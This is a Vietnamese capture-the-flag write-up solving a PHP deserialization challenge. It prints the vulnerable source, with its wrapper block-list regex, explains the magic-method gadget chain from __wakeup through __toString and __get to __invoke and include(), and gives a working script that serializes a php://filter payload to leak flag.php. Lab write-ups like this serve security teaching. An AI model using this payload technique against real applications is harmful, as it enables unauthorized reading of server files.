Challenge này cho ta source code luôn

```
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

Flag của ta là flag.php, bài này thuộc dạng deserialize và ta phải tìm cách trigger thông qua hàm append().Ở challenge này gồm các method magic:  __invoke(), __construct(), __toString(), __wakeup(), __get()

Goal là ta phải trigger được hàm append() thì ta phải trigger được hàm __invoke().Mà hàm invoke() được tự động gọi khi 1 đối tượng được gọi dưới dạng function.Vậy thì đối tượng của class Modifier phải được gọi dưới dạng funtion.

```php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```

```php
$a = new Modifire();
$a();
```

Tiếp theo ta đến class Test.Ta có thể trigger được hàm __invoke().

```php
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```

__get($key) sẽ trả về đối tượng $this->p là 1 đối tượng của class Test dưới dạng function, vậy thì nếu p ở đây là 1 đối tượng của class Modifier thì trigger được __invoke().

__get() ở đây sẽ được trigger khi ta đọc dữ liệu từ các thuộc tính không thể truy cập (protected hoặc private) hoặc không tồn tại. Để làm được điều này ta phải dùng đến __toString() trong class Show

```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```

Hàm __toString() return ra $this->str->source, mà để làm được thì đối tượng của class Show dưới dạng string.Và điều này được thực hiện bởi hàm __wakeup() vì nó dùng hàm preg_match() lên đối tượng của class Show.Vậy chỉ cần gán $source là 1 đối tượng của class Show.

```php
<?php
//flag is in flag.php
class Modifier {
    protected  $var="php://filter/convert.base64-encode/resource=flag.php";
}
class Show{
    public $source;
    public $str;
}
 
class Test{
    public $p;
}
 
$a = new Show();
$a->str = new Test();
$a->str->p = new Modifier();
$b = new Show();
$b->source = $a;
 
echo urlencode(serialize($b));
?>
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/aa39d5b5-f98e-489e-9f03-6def39374726)

Đem decode ra thì được flag

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/3fe1c27b-7e24-457f-b989-cf3c19f90dd6)
